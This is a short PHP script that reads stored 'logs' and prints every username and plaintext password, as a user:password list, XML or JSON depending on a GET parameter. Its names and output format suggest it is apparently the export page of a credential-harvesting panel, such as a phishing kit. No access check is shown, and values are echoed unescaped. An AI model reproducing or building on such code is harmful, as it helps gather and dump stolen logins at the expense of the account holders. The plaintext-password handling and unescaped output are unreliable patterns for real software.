<?php
include 'common.php';

$type = $_GET['type'];
$types = array('plain', 'xml', 'json');

if(!in_array($type, $types)) die($lang['INVALID_TYPE']);

$logs = $logs_model->get_logs();

switch($type)
{
	case 'plain':
		header('Content-Type: text/html; charset=UTF8');
		
		while($row = $logs->fetch_assoc())
		{
			echo $row['user_name'] . ':' . $row['user_password'] . '<br />';
		}
	break;
	case 'xml':
		header('Content-Type: text/xml; charset=UTF8');
		
		echo '<?xml version="1.0"?><users>';
		while($row = $logs->fetch_assoc())
		{
			echo '<user> <username>' . $row['user_name'] . '</username> <password>' . $row['user_password'] . '</password> </user>';
		}
		echo '</users>';
	break;
	case 'json':
		header('Content-Type: application/json; charset=UTF8');
		
		$data = array();
		while($row = $logs->fetch_assoc())
		{
			$data[] = array($row['user_name'], $row['user_password']);
		}
		
		echo json_encode($data);
}


?>